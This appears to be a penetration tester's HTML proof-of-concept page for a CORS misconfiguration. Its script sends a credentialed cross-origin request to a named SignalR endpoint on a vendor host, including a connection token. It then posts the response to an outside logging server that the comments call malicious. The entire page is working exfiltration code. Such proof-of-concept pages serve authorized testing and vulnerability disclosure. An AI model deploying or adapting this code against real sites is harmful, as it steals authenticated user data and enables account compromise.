<html>
	<head>
		<title>TrustedSec CORS POC</title>
	</head>
	<body>
		<h1>TrustedSec CORS POC</h>
		<script>
			var crossoriginget = new XMLHttpRequest();
			//The target site with the bad CORS configuration
			var url = 'https://pentest.panviva.supportpoint.com/signalr/connect?transport=webSockets&clientProtocol=1.5&window=&title=Login%20:%20SupportPoint&connectionToken=y4UCHY6xmGei1iX3vaAKgPHvq%2FJ76CkkgxW9imiAAK7mlV40ngwgSBN%2ByXTxdODlRy7Y8YAQ8dh2q1%2BPsXtNiEhQVFcyNz0WvX3lllZ%2F35MITgsU&connectionData=%5B%7B%22name%22%3A%22windowmanagementhub%22%7D%2C%7B%22name%22%3A%22browserloghub%22%7D%5D&tid=5';
			crossoriginget.open('GET', url, true);
			/*  This tells the browser to send the request with cookies;
			    requires “Access-Control-Allow-Credentials = true” in
			    response headers for this.responseText to be readable.  */
			crossoriginget.withCredentials = true;
			crossoriginget.onload = reqListener;
			crossoriginget.send();
			/*  Once the cross-origin request completes, attempt to read the
			    response text and send it to the malicious server using an
			    HTTP POST request.  */
			function reqListener() {
				var exfiltraterequest = new XMLHttpRequest();
				//Our server hosting the CORS attack
				var maliciousurl = 'http://datest.com/postlogger.py';
				exfiltraterequest.open('POST', maliciousurl);
				exfiltraterequest.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
				exfiltraterequest.send('responsehtml=' + encodeURIComponent(String(this.responseText)));
			};
		</script>
	</body>
</html>
